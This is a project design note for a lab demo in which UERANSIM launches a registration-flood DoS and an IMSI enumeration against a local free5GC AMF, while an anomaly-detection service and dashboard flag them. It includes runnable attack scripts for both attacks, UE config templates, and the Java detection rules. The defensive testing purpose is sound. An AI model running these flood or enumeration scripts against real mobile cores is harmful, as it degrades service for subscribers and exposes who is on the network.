---
title: Phase 3 — UERANSIM Attack Scenarios + Live Anomaly Detection
tags: [5gc, security, ueransim, anomaly, dos, imsi, phase3, risks]
updated: 2026-09-15
---

# Phase 3 — UERANSIM Attack Scenarios + Live Anomaly Detection

The most visually impressive demo: real attacks fired from UERANSIM hit the AMF live,
Prometheus metrics spike, the anomaly-detection-service (9003) detects them in real time,
and the Angular Security Dashboard lights up with live alerts — all in one screen.

---

## Attack Scenario Overview

| ID | Name | Target NF | Signal | Visual |
|---|---|---|---|---|
| ATK-01 | Registration Flood (DoS) | AMF | `amf_reg_requests_total` spike | Red burst on timeline chart |
| ATK-02 | IMSI Enumeration | AMF / UDM | repeated `IdentityRequest` with sequential IMSIs | Orange step-pattern on heatmap |

---

## Architecture — end-to-end signal path

```
  UERANSIM gnb/ue (attack mode)
       │   NAS Registration / Identity Request flood
       ▼
  ┌──────────────────────────────────────────────────┐
  │  free5GC AMF                                      │
  │  • amf_reg_requests_total counter increments fast │
  │  • auth failures increment amf_auth_failure_total │
  └──────────┬───────────────────────────────────────┘
             │  Prometheus scrape every 5 s
             ▼
  ┌──────────────────────┐
  │  Prometheus :9090     │
  │  + Alertmanager rules │
  └──────────┬───────────┘
             │  PromQL query every 10 s (or push via remote-write)
             ▼
  ┌──────────────────────────────────────────────────┐
  │  anomaly-detection-service :9003 (Spring Boot)    │
  │  • Rule-based P1: rate(reg_requests[30s]) > 20/s  │
  │  • z-score P2: stddev over 5-min sliding window   │
  │  • emits AnomalyEvent → Kafka topic `sec-alerts`  │
  └──────────┬───────────────────────────────────────┘
             │  WebSocket / SSE   OR   REST polling
             ▼
  ┌──────────────────────────────────────────────────┐
  │  Angular Security Dashboard  /security/dashboard  │
  │  • real-time alert banner (red)                   │
  │  • timeline chart: registration rate spikes       │
  │  • heatmap: IMSI probe pattern                    │
  │  • alert table: ATK-01 / ATK-02 entries           │
  └──────────────────────────────────────────────────┘
```

---

## ATK-01 — Registration Flood (DoS on AMF)

### What it does
Sends hundreds of NAS `Registration Request` messages per second from many simulated UEs,
exhausting AMF CPU / connection state and triggering rate-limit rejection of legitimate UEs.

### UERANSIM config — flood gnb
File: `config/free5gc-gnb-flood.yaml`
```yaml
mcc: '001'
mnc: '01'
nci: '0x000000010'
idLength: 32
tac: 1
linkIp: 127.0.0.1
ngapIp: 127.0.0.1
gtpIp: 127.0.0.1
amfConfigs:
  - address: 127.0.0.1
    port: 38412
slices:
  - sst: 1
    sd: '010203'
ignoreStreamIds: true
```

File: `config/free5gc-ue-flood.yaml` (template — spawn N copies)
```yaml
supi: 'imsi-001010000000001'   # incremented per instance
mcc: '001'
mnc: '01'
key: '8baf473f2f8fd09487cccbd7097c6862'
op: '8e27b6af0e692e750f32667a3b14605d'
opType: 'OPC'
amf: '8000'
imeiSv: '0035609204079514'
gnbSearchList:
  - 127.0.0.1
uacAic:
  mps: false
  mcs: false
uacAcc:
  normalClass: 0
  class11: false
  class12: false
  class13: false
  class14: false
  class15: false
initialSlices:
  - sst: 1
    sd: '010203'
```

### Attack launch script — `scripts/attack-reg-flood.sh`
```bash
#!/bin/bash
# ATK-01: Registration flood — 50 concurrent UEs hammering AMF
# Usage: ./attack-reg-flood.sh [count=50] [duration=60]
COUNT=${1:-50}
DURATION=${2:-60}

echo "[ATK-01] Launching registration flood: $COUNT UEs for ${DURATION}s"

for i in $(seq 1 $COUNT); do
  SUPI=$(printf "imsi-00101%010d" $i)
  sed "s/supi: .*/supi: '$SUPI'/" config/free5gc-ue-flood.yaml > /tmp/ue-$i.yaml
  nr-ue -c /tmp/ue-$i.yaml &
done

sleep $DURATION

echo "[ATK-01] Stopping flood"
pkill -f nr-ue
echo "[ATK-01] Done"
```

### Prometheus metrics that spike
```promql
# Registration request rate — normal: ~0.1/s, flood: >20/s
rate(amf_reg_requests_total[30s])

# Auth failures — sequential IMSIs fail AUSF auth
rate(amf_auth_failure_total[30s])

# AMF goroutine/thread pressure (if instrumented)
amf_active_sessions
```

### Anomaly detection rule (P1 — rule-based, immediate)
```java
// In anomaly-detection-service: RuleEngine.java
if (regRate > 20.0) {
    emit(AnomalyEvent.builder()
        .id(UUID.randomUUID())
        .type("REGISTRATION_FLOOD")
        .severity(Severity.CRITICAL)
        .sourceIp("ueransim-attacker")
        .targetNf("AMF")
        .metric("amf_reg_requests_total")
        .observedRate(regRate)
        .threshold(20.0)
        .message("Registration flood detected: %.1f req/s (threshold 20/s)".formatted(regRate))
        .timestamp(Instant.now())
        .build());
}
```

---

## ATK-02 — IMSI Enumeration

### What it does
Sends NAS `Identity Response` messages with sequentially incrementing IMSIs.
The AMF/UDM responds differently to valid vs invalid IMSIs (timing side-channel or explicit error),
allowing an attacker to build a list of active subscribers.

### Attack script — `scripts/attack-imsi-enum.sh`
```bash
#!/bin/bash
# ATK-02: IMSI enumeration — probe sequential IMSIs
# Usage: ./attack-imsi-enum.sh [start=1] [end=100]
START=${1:-1}
END=${2:-100}

echo "[ATK-02] IMSI enumeration: $START → $END"

for i in $(seq $START $END); do
  SUPI=$(printf "imsi-00101%010d" $i)
  sed "s/supi: .*/supi: '$SUPI'/" config/free5gc-ue-flood.yaml > /tmp/probe-$i.yaml

  # Register + immediately deregister — probe-and-go pattern
  timeout 3 nr-ue -c /tmp/probe-$i.yaml &
  sleep 0.1   # 100 ms between probes → 10/s = suspicious but not flood
done

wait
echo "[ATK-02] Enumeration complete"
```

### Signal pattern that reveals enumeration
- Auth failures arrive at a **metered rate** (not burst) — 10 attempts/s
- IMSI values are **sequential** — can be detected by sorting recent auth-failure IMSIs
- Timing pattern: each attempt lasts exactly ~100–300 ms then drops — not natural UE behavior

### Anomaly detection rule (P1 + P2)

**P1 — sequential IMSI pattern (rule-based):**
```java
// Sliding window of last 60 auth-failure IMSIs
// If the IMSI suffix difference between consecutive failures is ≤ 2 for ≥ 5 in a row → enumeration
List<Long> recentImsis = getRecentAuthFailureImsis(Duration.ofSeconds(60));
if (isSequential(recentImsis, maxGap=2, minRun=5)) {
    emit(AnomalyEvent.builder()
        .type("IMSI_ENUMERATION")
        .severity(Severity.HIGH)
        .targetNf("AMF/UDM")
        .message("Sequential IMSI probe detected: %d attempts in 60s".formatted(recentImsis.size()))
        .build());
}
```

**P2 — z-score on auth failure rate (statistical):**
```java
// 5-minute sliding window mean + stddev
// If current rate deviates > 3σ from baseline → alert
double z = (currentRate - windowMean) / windowStddev;
if (z > 3.0) {
    emit(AnomalyEvent.builder()
        .type("AUTH_FAILURE_SPIKE")
        .severity(Severity.MEDIUM)
        .zScore(z)
        .message("Auth failure rate %.1f σ above baseline".formatted(z))
        .build());
}
```

---

## anomaly-detection-service (9003) — implementation sketch

### Key classes
```
anomaly-detection-service/
  src/main/java/.../anomaly/
    model/
      AnomalyEvent.java          # event record (type, severity, metric, message, timestamp)
      Severity.java              # CRITICAL / HIGH / MEDIUM / LOW
    ingest/
      PrometheusPoller.java      # polls Prometheus /api/v1/query every 10s via RestTemplate
      MetricSnapshot.java        # value + timestamp
    engine/
      RuleEngine.java            # P1 threshold rules → emits AnomalyEvent
      ZScoreEngine.java          # P2 sliding-window z-score → emits AnomalyEvent
      SlidingWindow.java         # fixed-size circular buffer per metric
    store/
      AnomalyStore.java          # in-memory (ConcurrentLinkedDeque, last 500 events)
    web/
      AnomalyController.java     # GET /api/anomaly/events, GET /api/anomaly/live (SSE)
      AnomalyWebSocketHandler.java  # pushes AnomalyEvent JSON to subscribed clients
```

### PrometheusPoller queries (every 10 s)
```java
Map<String, String> queries = Map.of(
  "reg_rate",      "rate(amf_reg_requests_total[30s])",
  "auth_fail_rate","rate(amf_auth_failure_total[30s])",
  "active_sessions","amf_active_sessions",
  "n2_msg_rate",   "rate(amf_n2_messages_total[30s])"
);
```

### SSE endpoint (Angular polls this)
```
GET /api/anomaly/live
Content-Type: text/event-stream

data: {"type":"REGISTRATION_FLOOD","severity":"CRITICAL","observedRate":47.3,"threshold":20.0,"timestamp":"..."}
data: {"type":"IMSI_ENUMERATION","severity":"HIGH","message":"Sequential IMSI probe: 32 attempts/60s","timestamp":"..."}
```

### application.yml additions
```yaml
server:
  port: 9003

anomaly:
  prometheus-url: http://localhost:9090
  poll-interval-ms: 10000
  reg-flood-threshold: 20.0    # req/s
  zscore-threshold: 3.0
  window-size: 30              # samples (= 5 min at 10s interval)
```

---

## Angular Security Dashboard — live updates

### Component: `security/dashboard` signals
```typescript
events   = signal<AnomalyEvent[]>([]);
critical = computed(() => this.events().filter(e => e.severity === 'CRITICAL'));
high     = computed(() => this.events().filter(e => e.severity === 'HIGH'));

ngOnInit() {
  // SSE stream from anomaly-detection-service
  const src = new EventSource('/api/anomaly/live');
  src.onmessage = ({ data }) => {
    const ev: AnomalyEvent = JSON.parse(data);
    this.events.update(list => [ev, ...list].slice(0, 100));
  };
}
```

### What the demo audience sees

```
╔══════════════════════════════════════════════════════════════════════╗
║  🔴 CRITICAL  REGISTRATION_FLOOD   AMF   47.3 req/s  14:32:07       ║
║  🟠 HIGH      IMSI_ENUMERATION     AMF   32 probes/60s  14:32:15    ║
╠══════════════════════════════════════════════════════════════════════╣
║  Registration rate                                                   ║
║  50 ┤                        ╭──╮                                    ║
║  40 ┤                     ╭──╯  ╰──╮   ← ATK-01 flood               ║
║  30 ┤                  ╭──╯        ╰──╮                              ║
║  20 ┤──threshold────────────────────────────────────────             ║
║  10 ┤────────────╯                       ╰──────────                 ║
║   0 └──────────────────────────────────────────────▶ time           ║
╠══════════════════════════════════════════════════════════════════════╣
║  Auth failure heatmap  (IMSI suffix × time bucket)                   ║
║  ...001 ████░░░░░░░░   ← sequential IMSIs light up left-to-right     ║
║  ...002 ░████░░░░░░░                                                  ║
║  ...003 ░░████░░░░░░                                                  ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Demo run order (for presentation)

```
1. Start services:  gateway (9000) + anomaly-detection-service (9003)
2. Open browser:    /security/dashboard  (Security Analyst role)
3. Confirm quiet:   reg rate ≈ 0, no alerts
4. Launch ATK-01:   ./scripts/attack-reg-flood.sh 50 60
   → watch red CRITICAL banner appear within ~10s
   → registration rate chart spikes to 40-50/s
5. Stop ATK-01:     pkill nr-ue
   → chart drops, banner fades after cool-down window
6. Launch ATK-02:   ./scripts/attack-imsi-enum.sh 1 200
   → orange HIGH banner: "Sequential IMSI probe"
   → heatmap shows diagonal stripe pattern
7. Show alert table: both ATK-01 + ATK-02 logged with timestamps
```

---

## Gateway route to add

```yaml
# spring-cloud/gateway-service/src/main/resources/application.yml
- id: anomaly-service
  uri: http://localhost:9003
  predicates:
    - Path=/api/anomaly/**
```

---

## Prometheus scrape targets to add

```yaml
# docker/prometheus/prometheus.yml
- job_name: 'anomaly-detection-service'
  static_configs:
    - targets: ['host.docker.internal:9003']

# free5GC AMF metrics (if exposed)
- job_name: 'free5gc-amf'
  static_configs:
    - targets: ['host.docker.internal:8080']   # verify port in AMF config
  metrics_path: /metrics
```

---

## Risks to existing design and Docker containers

### Risk 1 — The flood is a real DoS (most critical)
`attack-reg-flood.sh` spawns real `nr-ue` processes firing live NAS messages at the AMF container.
This is not simulated — the AMF will genuinely be stressed.

**What can break:**
- AMF container OOMs or crashes → entire free5GC Docker stack goes down
- WebConsole (port 5000) becomes unreachable → Angular `/security/5gc` page errors mid-demo
- Other NFs (SMF, UDM) that depend on AMF may timeout and restart

**Mitigation:**
- Keep `COUNT` at 10–15 for the real presentation (still triggers the alert, less risk)
- Keep a terminal open with `docker stats` watching AMF container memory
- Stage recovery command before the demo:
  ```bash
  docker compose -f docker/docker-compose-5gc.yml restart amf
  ```

---

### Risk 2 — Host resource exhaustion (Windows / WSL2)
UERANSIM requires Linux raw sockets — it runs in WSL2. free5GC also runs via Docker (WSL2 backend).
50 WSL2 processes + free5GC containers + Spring Boot JARs = real RAM pressure.
WSL2 has a shared memory ceiling (~8 GB default); both the flood and free5GC may fight over it.

**Mitigation** — set WSL2 memory cap in `%UserProfile%\.wslconfig`:
```ini
[wsl2]
memory=12GB
processors=6
```
Test with 10 UEs on your machine before committing to 50 for the demo.

---

### Risk 3 — Two-Docker-project network clash
From project memory: `nexus-docker` (Keycloak + PostgreSQL :5432) and `docker` (free5GC + infra)
share the host's Docker bridge. During a flood, Docker internal bridge ARP tables get hammered.

**Risk:** Keycloak's PostgreSQL connection drops → auth-service (9001) returns 401s →
users get logged out from the Angular app **during the presentation**.

**Mitigation:** Verify free5GC uses its own isolated Docker network and shares nothing with `nexus-docker`:
```bash
docker network inspect free5gc-net
docker network inspect nexus-docker_default
# Make sure no container appears in both
```

---

### Risk 4 — AMF metrics may not be exposed by default
The entire detection pipeline depends on `amf_reg_requests_total` existing in Prometheus.
If the metric doesn't exist, `PrometheusPoller` returns empty, `RuleEngine` never fires,
and the dashboard stays blank during the attack — the worst demo outcome.

**Verify before the demo:**
```bash
curl http://localhost:8080/metrics | grep amf_reg
```
If nothing comes back, add the metrics port to AMF config and to `prometheus.yml`.

---

### Risk 5 — IMSI enumeration floods container logs
200 sequential auth failures each produce a log line inside AMF/UDM containers.
Docker has no default log size limit — disk can fill up.

**Mitigation** — add log rotation to free5GC compose:
```yaml
services:
  amf:
    logging:
      driver: "json-file"
      options:
        max-size: "50m"
        max-file: "3"
```

---

### Risk 6 — `pkill nr-ue` kills all UERANSIM sessions
The stop command kills **every** `nr-ue` process on the host, including any legitimate
UERANSIM sessions running for conformance tests.

**Mitigation** — use a process group:
```bash
# Start attack in its own group
setsid bash scripts/attack-reg-flood.sh &
ATTACK_PID=$!
# Stop only that group
kill -- -$ATTACK_PID
```

---

### Risk 7 — Port 9003 already bound by placeholder service
Port 9003 is currently occupied by a placeholder `anomaly-detection-service` stub.
When implementing the real service, stop the placeholder first or the port will be bound.

```bash
# Check before starting
netstat -ano | findstr :9003
```

---

### Risk summary table

| Risk | Severity | Breaks existing work? | Fix |
|---|---|---|---|
| AMF crash from flood | HIGH | Yes — free5GC stack down | Reduce UE count; stage restart command |
| WSL2 memory exhaustion | HIGH | Yes — containers OOM-killed | Set `memory=12GB` in `.wslconfig` |
| Keycloak drops during flood | MEDIUM | Yes — logins fail mid-demo | Verify network isolation between compose stacks |
| AMF metrics not scraped | MEDIUM | No, but demo fails silently | Verify `curl :8080/metrics` beforehand |
| Log file bloat | LOW | No | Add log rotation to compose |
| `pkill` kills legitimate UEs | LOW | No, disrupts other tests | Use process groups |
| Port 9003 already bound | MEDIUM | No, new service fails to start | Kill placeholder first |

---

## Related notes

- [[Zero-Trust-Phase2]] — Phase 2: SBI TLS + NRF OAuth2 (SEC-01/02)
- [[5GC-Core]] — free5GC + UERANSIM setup
- [[Backend-and-Infra]] — service ports, gateway config
- [[Next-Steps]] — Phase 3 checklist
- [[Grafana-Dashboards]] — D4 Security/Anomaly dashboard design
